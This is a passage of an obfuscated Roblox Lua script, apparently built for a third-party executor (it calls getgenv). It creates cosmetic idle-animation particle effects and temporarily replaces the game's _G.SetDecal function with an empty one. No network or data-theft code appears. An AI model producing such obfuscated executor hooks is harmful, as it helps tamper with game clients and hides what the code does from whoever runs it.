_IIllIIIlll.RotSpeed=NumberRange.new(0x0) task.delay(.0x5, function () _IIllIIIlll.Rate=0x0 end
 ) end
 ) task.wait(.0x5) end
 elseif idleName == "\091\083\071\093\032\080\117\114\105\116\121" then while _llIIlIIllI() do local _IIllllIlII, _llIIIIIIIl = _lIIIIIIllI() if not _IIllllIlII or not _llIIIIIIIl then task.wait(.0x5) continue end
 local _lIIIIllIll=Instance.new("\080\097\114\116"); _llIllIlIlI:AddItem(_lIIIIllIll,1.5) _lIIIIllIll.Material=Enum.Material.Neon; _lIIIIllIll.Size=Vector3.new(0x1,0x1,0x1) _lIIIIllIll.Anchored=true; _lIIIIllIll.CanCollide=false; _lIIIIllIll.Color=Color3.new(0x0,0x1,0x1) _lIIIIllIll.Parent=_llIIIIllIl() local _IIIIlIIIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIIIllIll); _IIIIlIIIII.MeshType="\083\112\104\101\114\101" local _IIllIIIlll=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIIIllIll) _IIllIIIlll.LightEmission=0xF; _IIllIIIlll.Brightness=0x1; _IIllIIIlll.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _IIllIIIlll.Rate=0x9B; _IIllIIIlll.Lifetime=NumberRange.new(1.5) _IIllIIIlll.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x5),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0xFF,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0xFF,0xFF))} _IIllIIIlll.Speed=NumberRange.new(0x1); _IIllIIIlll.Acceleration=Vector3.new(0x0,0x0,.0x1); _IIllIIIlll.VelocitySpread=0x0 _IIllIIIlll.ZOffset=0x0; _IIllIIIlll.Rotation=NumberRange.new(0x0); _IIllIIIlll:Emit(0x1); _IIllIIIlll.LockedToPart=true task.delay(.0x1, function () _IIllIIIlll.Rate=0x0 end
 ) _lIIIIllIll.CFrame=_IIllllIlII.Torso.CFrame*CFrame.new(math.random(-0x19,0x19),-0x5,math.random(-0x19,0x19)) _IIIlIlIIlI:Create(_lIIIIllIll,TweenInfo.new(1.5),{Size=Vector3.new(0x0,0x0,0x0),CFrame=_lIIIIllIll.CFrame*CFrame.new(math.random(-0x5,0x5),0xF+math.random(0x2,0x8),math.random(-0x5,0x5))}):Play() task.wait(.0x5) end
 elseif idleName == "\091\083\071\093\032\069\117\099\108\105\100\101\097\110" then local _lIlllIlIll = 0x0 while _llIIlIIllI() do _lIlllIlIll = _lIlllIlIll + 0x1 local _IIllllIlII, _llIIIIIIIl = _lIIIIIIllI() if not _IIllllIlII or not _llIIIIIIIl then task.wait(.0x1) continue end
 local _IIIlllIIII = _IIllllIlII:FindFirstChild("\076\101\102\116\032\065\114\109") if not _IIIlllIIII then task.wait(.0x1) continue end
 local _IlIIIIllIl = math.random(0x0,0x1) local _IIlIIIllll = _IlIIIIllIl==0x1 and Color3.new(0x1,0x0,0x0) or Color3.new(0x0,0x0,0x1) local _lIIIlIlIll=Instance.new("\080\097\114\116"); _lIIIlIlIll.Parent=_llIIIIllIl(); _lIIIlIlIll.Material=Enum.Material.Neon _lIIIlIlIll.Anchored=true; _lIIIlIlIll.CanCollide=false; _lIIIlIlIll.Color=_IIlIIIllll local _IIIIlIIIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIIlIlIll); _IIIIlIIIII.MeshType="\083\112\104\101\114\101"; _IIIIlIIIII.Scale=Vector3.new(.0x5,.0x5,.0x5) _lIIIlIlIll.CFrame=_IIIlllIIII.CFrame*CFrame.new(0x0,-0x1,0x0)*CFrame.Angles(math.random(-0x168,0x168),math.random(-0x168,0x168),math.random(-0x168,0x168)) _llIllIlIlI:AddItem(_lIIIlIlIll,0x2) _IIIlIlIIlI:Create(_lIIIlIlIll,TweenInfo.new(0x1),{CFrame=_lIIIlIlIll.CFrame*CFrame.new(0x0,0x3,0x0)}):Play() _IIIlIlIIlI:Create(_IIIIlIIIII,TweenInfo.new(.0x5),{Scale=Vector3.new(0x0,0x2,0x0)}):Play() local _IIIIlIIIlI=Instance.new("\080\097\114\116"); _IIIIlIIIlI.Parent=_llIIIIllIl(); _IIIIlIIIlI.Material=Enum.Material.Neon _IIIIlIIIlI.Anchored=true; _IIIIlIIIlI.CanCollide=false; _IIIIlIIIlI.Size=Vector3.new(.0x3,.0x3,.0x3); _IIIIlIIIlI.Color=_IIlIIIllll _llIllIlIlI:AddItem(_IIIIlIIIlI,.0x8) if math.random(0x0,0x1)==0x0 then _IIIIlIIIlI.CFrame=_llIIIIIIIl.CFrame*CFrame.new(math.random(-0xF,0xF),-0x3,math.random(-0xF,0xF))*CFrame.Angles(math.rad(math.random(-0xF,0xF)),math.rad(math.random(-0xF,0xF)),math.rad(math.random(-0xF,0xF))) _IIIlIlIIlI:Create(_IIIIlIIIlI,TweenInfo.new(.0x8),{Size=Vector3.new(0x0,0x2+math.random(0x2,0x4),0x0),CFrame=_IIIIlIIIlI.CFrame*CFrame.new(0x0,0x2,0x0)}):Play() local _IIllIIIlll=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_IIIIlIIIlI) _IIllIIIlll.LightEmission=0x1; _IIllIIIlll.Brightness=0x1; _IIllIIIlll.Orientation="\070\097\099\105\110\103\067\097\109\101\114\097\087\111\114\108\100\085\112"; _IIllIIIlll.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _IIllIIIlll.Rate=0xFF; _IIllIIIlll.Lifetime=NumberRange.new(.0x6) _IIllIIIlll.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,math.random(0x1,0x5)),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x5,-0x1),NumberSequenceKeypoint.new(.0x5,0x0),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x8),NumberSequenceKeypoint.new(0x1,0x1)}) if _IlIIIIllIl==0x1 then _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0x0,0x0)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x7F,0x0,0x0))} else _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0xFC,0xFF,0xFF))} end
 _IIllIIIlll.Speed=NumberRange.new(0x0); _IIllIIIlll.VelocitySpread=0xC350; _IIllIIIlll.ZOffset=0x2; _IIllIIIlll.Rotation=NumberRange.new(0x5A) _IIllIIIlll:Emit(0x1); _IIllIIIlll.LockedToPart=true; task.delay(.0x3, function () _IIllIIIlll.Rate=0x0 end
 ) else _IIIIlIIIlI.CFrame=_llIIIIIIIl.CFrame*CFrame.new(math.random(-0xF,0xF),math.random(-0x3,0xF),math.random(-0xF,0xF))*CFrame.Angles(_lIlllIlIll,_lIlllIlIll,-_lIlllIlIll) _IIIlIlIIlI:Create(_IIIIlIIIlI,TweenInfo.new(.0x8),{Size=Vector3.new(0x0,0x0,0x0),CFrame=_IIIIlIIIlI.CFrame*CFrame.new(0x0,0x2,0x0)}):Play() local _IIllIIIlll=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_IIIIlIIIlI) _IIllIIIlll.LightEmission=0x1; _IIllIIIlll.Brightness=0x1; _IIllIIIlll.Orientation="\070\097\099\105\110\103\067\097\109\101\114\097\087\111\114\108\100\085\112"; _IIllIIIlll.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _IIllIIIlll.Rate=0x4D; _IIllIIIlll.Lifetime=NumberRange.new(.0x3) _IIllIIIlll.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,math.random(0x1,0x5)),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x2),NumberSequenceKeypoint.new(.0x1,-0x2),NumberSequenceKeypoint.new(.0x2,0x2),NumberSequenceKeypoint.new(.0x3,-0x2),NumberSequenceKeypoint.new(.0x4,0x2),NumberSequenceKeypoint.new(.0x5,-0x2),NumberSequenceKeypoint.new(.0x5,0x0),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x8),NumberSequenceKeypoint.new(0x1,0x1)}) if _IlIIIIllIl==0x1 then _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0x0,0x0)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0xFC,0xFF,0xFF))} else _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0xFC,0xFF,0xFF))} end
 _IIllIIIlll.Speed=NumberRange.new(0x0); _IIllIIIlll.VelocitySpread=0xC350; _IIllIIIlll.ZOffset=0x0; _IIllIIIlll.Rotation=NumberRange.new(0x5A) _IIllIIIlll:Emit(0x1); _IIllIIIlll.LockedToPart=true; task.delay(.0x3, function () _IIllIIIlll.Rate=0x0 end
 ) end
 task.wait(.0x1) end
 elseif idleName == "\091\083\071\093\032\069\113\117\105\110\111\120" then while _llIIlIIllI() do local _IIllllIlII, _llIIIIIIIl = _lIIIIIIllI() if not _IIllllIlII or not _llIIIIIIIl then task.wait(.0x1) continue end
 local _llllllIIII=math.random(0x0,0x1) local _lIIIIllIll=Instance.new("\080\097\114\116"); _llIllIlIlI:AddItem(_lIIIIllIll,.0x7) _lIIIIllIll.Material=Enum.Material.Neon; _lIIIIllIll.Size=Vector3.new(0x1,0x1,0x1) _lIIIIllIll.Anchored=true; _lIIIIllIll.CanCollide=false; _lIIIIllIll.Color=Color3.new(_llllllIIII,_llllllIIII,_llllllIIII) _lIIIIllIll.Parent=_llIIIIllIl() local _IIIIlIIIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIIIllIll); _IIIIlIIIII.MeshType="\083\112\104\101\114\101" _lIIIIllIll.CFrame=CFrame.new(_llIIIIIIIl.CFrame.X+math.random(-0x19,0x19),_llIIIIIIIl.CFrame.Y-0x3,_llIIIIIIIl.CFrame.Z+math.random(-0x19,0x19)) local _IIllIIIlll=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIIIllIll) _IIllIIIlll.LightEmission=0x9B; _IIllIIIlll.Brightness=0x1; _IIllIIIlll.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _IIllIIIlll.Rate=0x9B; _IIllIIIlll.Lifetime=NumberRange.new(.0x5) _IIllIIIlll.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,math.random(0x1,0x5)*0x5),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108" _IIllIIIlll.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x0),NumberSequenceKeypoint.new(.0x3,-0x7),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0xFF,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0x0))} _IIllIIIlll.Speed=NumberRange.new(0x1); _IIllIIIlll.Acceleration=Vector3.new(0x0,0x0,.0x1); _IIllIIIlll.VelocitySpread=0x0 _IIllIIIlll.ZOffset=-0x2; _IIllIIIlll.Rotation=NumberRange.new(0x0); _IIllIIIlll:Emit(0x1) task.delay(.0x1, function () _IIllIIIlll.Rate=0x0 end
 ) _IIIIlIIIII.Scale=Vector3.new(0x3,0x3,0x3) _IIIlIlIIlI:Create(_IIIIlIIIII,TweenInfo.new(0x1),{Scale=Vector3.new(0x0,0x2D,0x0)}):Play() _IIIlIlIIlI:Create(_lIIIIllIll,TweenInfo.new(1.6),{Transparency=0x1}):Play() task.wait(.0x1) end
 elseif idleName == "\091\083\071\093\032\067\114\097\122\101\100" then while _llIIlIIllI() do local _IIllllIlII, _llIIIIIIIl = _lIIIIIIllI() if not _IIllllIlII or not _llIIIIIIIl then task.wait(.0x5) continue end
 spawn( function () local _lIIIIllIll=Instance.new("\080\097\114\116"); _llIllIlIlI:AddItem(_lIIIIllIll,1.5) _lIIIIllIll.Material=Enum.Material.Neon; _lIIIIllIll.Anchored=true; _lIIIIllIll.CanCollide=false _lIIIIllIll.Color=Color3.new(0x0,0x0,0x1); _lIIIIllIll.Parent=_llIIIIllIl() local _IIIIlIIIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_lIIIIllIll); _IIIIlIIIII.MeshType="\083\112\104\101\114\101" local _IIllIIIlll=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_lIIIIllIll) _IIllIIIlll.LightEmission=0xF; _IIllIIIlll.Brightness=0x1; _IIllIIIlll.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _IIllIIIlll.Rate=0x9B; _IIllIIIlll.Lifetime=NumberRange.new(3.5) _IIllIIIlll.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x5),NumberSequenceKeypoint.new(0x1,0xF)}) _IIllIIIlll.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x5),NumberSequenceKeypoint.new(0x1,0xF)}) _IIllIIIlll.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0xFF))} _IIllIIIlll.Speed=NumberRange.new(0x0); _IIllIIIlll.Acceleration=Vector3.new(0x0,0x5,0x0); _IIllIIIlll.VelocitySpread=0x0 _IIllIIIlll.ZOffset=0x0; _IIllIIIlll.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108"; _IIllIIIlll.Rotation=NumberRange.new(0x5A) _IIllIIIlll:Emit(0x1); _IIllIIIlll.LockedToPart=true; task.delay(.0x1, function () _IIllIIIlll.Rate=0x0 end
 ) spawn( function () for j=0x1,0x2D do _lIIIIllIll.Color=Color3.fromRGB(0x0,0x0,math.random(0x1,0x9B)) task.wait(.0x2) end
 end
 ) _lIIIIllIll.Size=Vector3.new(0x1,.0x1,0x1) _lIIIIllIll.CFrame=_llIIIIIIIl.CFrame*CFrame.new(math.random(-0x4D,0x4D),-0x2,math.random(-0x4D,0x4D))*CFrame.Angles(math.rad(math.random(-0xF,0xF)),0x0,0x0) _IIIlIlIIlI:Create(_lIIIIllIll,TweenInfo.new(.0x5),{Size=Vector3.new(0x2,.0x2,0x2)}):Play() task.wait(.0x5) _IIIlIlIIlI:Create(_lIIIIllIll,TweenInfo.new(1.5),{CFrame=_lIIIIllIll.CFrame*CFrame.new(math.random(-0x5,0x5)/0x5,0xF+math.random(0x2,0x8),math.random(-0x5,0x5)/0x5),Size=Vector3.new(0x0,0x9B,0x0)}):Play() local _IIIIIllIIl=Instance.new("\080\097\114\116"); _llIllIlIlI:AddItem(_IIIIIllIIl,1.5) _IIIIIllIIl.Material=Enum.Material.Neon; _IIIIIllIIl.Anchored=true; _IIIIIllIIl.CanCollide=false _IIIIIllIIl.Color=Color3.new(0x0,0x0,0x1); _IIIIIllIIl.Parent=_llIIIIllIl() local _IIlIlIlllI=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_IIIIIllIIl); _IIlIlIlllI.MeshType="\083\112\104\101\114\101" local _llIlIlIlIl=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_IIIIIllIIl) _llIlIlIlIl.LightEmission=0xF; _llIlIlIlIl.Brightness=0x1; _llIlIlIlIl.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _llIlIlIlIl.Rate=0x9B; _llIlIlIlIl.Lifetime=NumberRange.new(.0x5) _llIlIlIlIl.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x2),NumberSequenceKeypoint.new(0x1,0x2)}) _llIlIlIlIl.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x2),NumberSequenceKeypoint.new(0x1,0x2)}) _llIlIlIlIl.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x9),NumberSequenceKeypoint.new(0x1,0x1)}) _llIlIlIlIl.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0x0,0x0,0xFF)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0x0,0x0,0xFF))} _llIlIlIlIl.Speed=NumberRange.new(0x0); _llIlIlIlIl.Acceleration=Vector3.new(0x0,.0x3,0x0); _llIlIlIlIl.VelocitySpread=0x0 _llIlIlIlIl.ZOffset=0x0; _llIlIlIlIl.Orientation="\086\101\108\111\099\105\116\121\080\097\114\097\108\108\101\108"; _llIlIlIlIl.Rotation=NumberRange.new(0x0) _llIlIlIlIl:Emit(0x1); _llIlIlIlIl.LockedToPart=true; task.delay(.0x1, function () _llIlIlIlIl.Rate=0x0 end
 ) spawn( function () for j=0x1,0x2D do _IIIIIllIIl.Color=Color3.fromRGB(0x0,0x0,math.random(0x1,0x9B)) task.wait(.0x2) end
 end
 ) _IIIIIllIIl.Size=Vector3.new(0x3,.0x5,0x3); _IIIIIllIIl.CFrame=_IIllllIlII.Torso.CFrame*CFrame.new(0x0,0x0,0x7) _IIIlIlIIlI:Create(_IIIIIllIIl,TweenInfo.new(.0x2),{Size=Vector3.new(0x0,0x0,0x19)}):Play() end
 ) task.wait(.0x5) end
 elseif idleName == "\091\083\071\093\032\067\111\110\116\097\109\105\110\097\110\116" then local _lIIllIIIll = 0x3E7; local _llIlIIIIII = Color3.new(0x1,.0x7,0x0) while _llIIlIIllI() do _lIIllIIIll = _lIIllIIIll + .0x1 local _IIllllIlII, _llIIIIIIIl = _lIIIIIIllI() if not _IIllllIlII or not _llIIIIIIIl then task.wait(.0x2) continue end
 local _lIIlllIIll=_IIllllIlII:FindFirstChild("\082\105\103\104\116\032\065\114\109"); local _IIIlllIIII=_IIllllIlII:FindFirstChild("\076\101\102\116\032\065\114\109") if not _lIIlllIIll or not _IIIlllIIII then task.wait(.0x2) continue end
 local function _IIlIllIlII(arm) local _IIIIIlIlll=Instance.new("\080\097\114\116"); _IIIIIlIlll.Parent=_llIIIIllIl(); _IIIIIlIlll.Material=Enum.Material.Neon _IIIIIlIlll.Anchored=true; _IIIIIlIlll.CanCollide=false local _IIIIlIIIII=Instance.new("\083\112\101\099\105\097\108\077\101\115\104",_IIIIIlIlll); _IIIIlIIIII.MeshType="\083\112\104\101\114\101" _IIIIIlIlll.Color=_llIlIIIIII; _IIIIlIIIII.Scale=Vector3.new(.0x5,.0x5,.0x5) _IIIIIlIlll.CFrame=arm.CFrame*CFrame.new(0x0,-0x1,0x0)*CFrame.Angles(math.random(-0x168,0x168),math.random(-0x168,0x168),math.random(-0x168,0x168)) _llIllIlIlI:AddItem(_IIIIIlIlll,0x2) _IIIlIlIIlI:Create(_IIIIIlIlll,TweenInfo.new(0x1),{CFrame=_IIIIIlIlll.CFrame*CFrame.new(0x0,0x3,0x0)}):Play() _IIIlIlIIlI:Create(_IIIIlIIIII,TweenInfo.new(.0x5),{Scale=Vector3.new(0x0,0x2,0x0)}):Play() if _lIIllIIIll >= 0x1 then local _lIIIIIIIII=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_IIIIIlIlll); _lIIIIIIIII.LightEmission=0xF; _lIIIIIIIII.LightInfluence=0x1 _lIIIIIIIII.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x2),NumberSequenceKeypoint.new(0x1,0x1)}) _lIIIIIIIII.LockedToPart=true; _lIIIIIIIII.Name="\095\076\115\109\111\107\101" _lIIIIIIIII.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x5,0x0),NumberSequenceKeypoint.new(0x1,0x1)}) _lIIIIIIIII.Lifetime=NumberRange.new(0x1) _lIIIIIIIII.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,Color3.fromRGB(0xFF,0xC8,0x0)),ColorSequenceKeypoint.new(0x1,Color3.fromRGB(0xFF,0xC8,0x0))} _lIIIIIIIII.Rate=0x0; _lIIIIIIIII.Speed=NumberRange.new(-0x3); _lIIIIIIIII:Emit(0x1) _lIIIIIIIII.SpreadAngle=Vector2.new(0x1E,0x1E); _lIIIIIIIII.Rotation=NumberRange.new(0x1,0x168); _lIIIIIIIII.RotSpeed=NumberRange.new(-0x64,0x64) _lIIIIIIIII.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\057\052\055\048\054\053\057\056\057\057"; _lIIIIIIIII.Brightness=0x5; _lIIIIIIIII.LightEmission=0xA; _lIIIIIIIII.LightInfluence=0x0 _lIIIIIIIII.FlipbookFramerate=NumberRange.new(0x42); _lIIIIIIIII.FlipbookLayout="\071\114\105\100\056\120\056"; _lIIIIIIIII.FlipbookMode="\076\111\111\112"; _lIIIIIIIII.ZOffset=0x0 local _IIllIIIlll=Instance.new("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114",_IIIIIlIlll); _IIllIIIlll.LightEmission=0x9B; _IIllIIIlll.Texture="\114\098\120\097\115\115\101\116\105\100\058\047\047\054\054\055\051\048\050\049\057\056\052" _IIllIIIlll.Rate=0x9B; _IIllIIIlll:Emit(0x5); _IIllIIIlll.LockedToPart=true; _IIllIIIlll.Lifetime=NumberRange.new(0x1) _IIllIIIlll.Size=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x3),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Squash=NumberSequence.new({NumberSequenceKeypoint.new(0x0,math.random(-0xF,0xF)/0x23),NumberSequenceKeypoint.new(.0x1,math.random(-0xF,0xF)/0x23),NumberSequenceKeypoint.new(0x1,0x0)}) _IIllIIIlll.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0x0,0x1),NumberSequenceKeypoint.new(.0x1,.0x8),NumberSequenceKeypoint.new(0x1,0x1)}) _IIllIIIlll.Color=ColorSequence.new{ColorSequenceKeypoint.new(0x0,_llIlIIIIII),ColorSequenceKeypoint.new(0x1,_llIlIIIIII)} _IIllIIIlll.Speed=NumberRange.new(0x0); _IIllIIIlll.VelocitySpread=0xC350; _IIllIIIlll.Rotation=NumberRange.new(-0x1F4,0x1F4); _IIllIIIlll.RotSpeed=NumberRange.new(-0x1F4,0x1F4); _IIllIIIlll.ZOffset=0x2 task.delay(.0x5, function () _IIllIIIlll.Rate=0x0 end
 ) end
 end
 _IIlIllIlII(_lIIlllIIll); _IIlIllIlII(_IIIlllIIII) if _lIIllIIIll >= 0x1 then _lIIllIIIll = 0x0 end
 task.wait(.0x2) end
 else while _llIIlIIllI() do task.wait(.0x5) end
 end
 end
 local function _IlIIllllII() if not _llllIlllIl then return end
 _llllIlllIl = false _lIlIIllIll = _lIlIIllIll + 0x1 if getgenv()._sgOrigSetDecal ~= nil then pcall( function () if _G then _G.SetDecal = getgenv()._sgOrigSetDecal end
 end
 ) getgenv()._sgOrigSetDecal = nil end
 if _IIllllIlII then _IIllllIlII:Disconnect() _IIllllIlII = nil end
 if _lIIlllIIlI then _lIIlllIIlI:Disconnect() _lIIlllIIlI = nil end
 pcall( function () local _IlIIIIlIIl = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIIlIIl then _IlIIIIlIIl.CameraOffset = Vector3.new() end
 end
 ) end
 local function _lIllIlIlII(idleName) _lIlIIllIll = _lIlIIllIll + 0x1 local _lllllIIIll = _lIlIIllIll _llIlIIIlIl(_llIIIlIIll.Character) task.spawn(_lIlIllIIlI, idleName, _lllllIIIll) end
 local function _lIIlllIIlI(idleName) _llllIlllIl = true if _G and type(_G.SetDecal) == "\102\117\110\099\116\105\111\110" and getgenv()._sgOrigSetDecal == nil then getgenv()._sgOrigSetDecal = _G.SetDecal _G.SetDecal = function () end
 end
 if _lIIlllIIlI then _lIIlllIIlI:Disconnect() end
 _lIIlllIIlI = _llIIIlIIll.CharacterAdded:Connect( function (newChar) task.wait(0.1) if _llllIlllIl then _lIllIlIlII(_IIIIllllII) end
 end
 ) _lIllIlIlII(idleName) end
 _lIlIIIlllI = function () local _llIIlIlIlI = _IIlIlIIlIl.SGVFXToggle and _IIlIlIIlIl.SGVFXToggle.Value if _llIIlIlIlI and _llIlllIlII() then if not _llllIlllIl then _lIIlllIIlI(_IIIIllllII) else _lIllIlIlII(_IIIIllllII) end
 else _IlIIllllII() end
 end
 local function _IIlIIIllll(_IIIIllIIlI) local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII then return nil end
 local _IIIIllllll = Instance.new("\065\110\105\109\097\116\105\111\110") _IIIIllllll.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIIllIIlI return _IlIIIlIIII:LoadAnimation(_IIIIllllll) end
 local function _IIllIlIlIl(instant) _lllIllIIII = _lllIllIIII + 0x1 _lIIlIlIllI = false local _lIlIIIIlIl = (instant) and 0x0 or (_IlIllIIllI.IdleAnimationEndFadeTime and _IlIllIIllI.IdleAnimationEndFadeTime.Value or 0.2) if _IlllIlIlII then pcall( function () _IlllIlIlII:Cancel() end
 ) _IlllIlIlII = nil end
 if _IlIlIllllI then pcall( function () _IlIlIllllI:Stop(_lIlIIIIlIl) end
 ) _IlIlIllllI = nil end
 if _lllIllllIl then pcall( function () _lllIllllIl:Stop(_lIlIIIIlIl) end
 ) _lllIllllIl = nil end
 if _IlIIIIlIIl then pcall( function () _IlIIIIlIIl:Stop(_lIlIIIIlIl) end
 ) _IlIIIIlIIl = nil end
 if _IlIIIlIllI then pcall( function () _IlIIIlIllI:Stop(_lIlIIIIlIl) end
 ) _IlIIIlIllI = nil end
 if _IllIIlIIlI then pcall( function () _IllIIlIIlI:Stop(_lIlIIIIlIl) end
 ) _IllIIlIIlI = nil end
 pcall( function () local _IlIIIIlIIl = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlIIIIlIIl then _IlIIIIlIIl.HipHeight = 0x0 end
 end
 ) end
 local function _IlIllIlIII(_llllIIIlIl, _IIIIlllIIl) _lIllIllIlI = true if _IIIIlllIIl then local _lIlIIIIlIl = _IlIllIIllI.IdleAnimationEndFadeTime and _IlIllIIllI.IdleAnimationEndFadeTime.Value or 0.2 _IIllIlIlIl(false) task.wait(_lIlIIIIlIl) else _IIllIlIlIl(true) end
 local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII or _IlIIIlIIII.MoveDirection ~= Vector3.new() then _lllllIlllI = "" _IIIIllllII = "" _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 local _IIlIIIIIlI = _IlIllIIllI.IdleAnimation and _IlIllIIllI.IdleAnimation.Value or "\078\111\114\109\097\108" if _IIlIIIIIlI == "\078\111\114\109\097\108" then _lllllIlllI = "" _IIIIllllII = "" _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 if _IIlIIIIIlI ~= _llllIIIlIl then _lllllIlllI = "" _IIIIllllII = "" _lIllIllIlI = false task.defer(_lIlIIIlllI) return end
 local _IlIlIlllII = _llllIIIlIl if _IlIlIlllII == "\082\097\110\100\111\109" then local _lllllIllll = { "\091\068\069\070\093\032\087\097\116\099\104","\091\068\069\070\093\032\067\097\115\117\097\108","\091\068\069\070\093\032\067\111\110\102\105\100\101\110\116","\091\068\069\070\093\032\070\101\110\116\032\077\097\115\116\101\114","\091\068\069\070\093\032\070\108\121\032\073\100\108\101", "\091\068\069\070\093\032\065\117\114\097","\091\068\069\070\093\032\083\101\114\105\111\117\115","\091\068\069\070\093\032\082\101\119\111\114\107","\091\068\069\070\093\032\080\114\101\112\097\114\105\110\103","\091\068\069\070\093\032\068\105\118\105\110\101","\091\068\069\070\093\032\071\111\100", "\091\083\071\093\032\077\097\121\104\101\109","\091\083\071\093\032\082\097\105\110\098\111\119","\091\083\071\093\032\090\121\108\101\100\111\110", 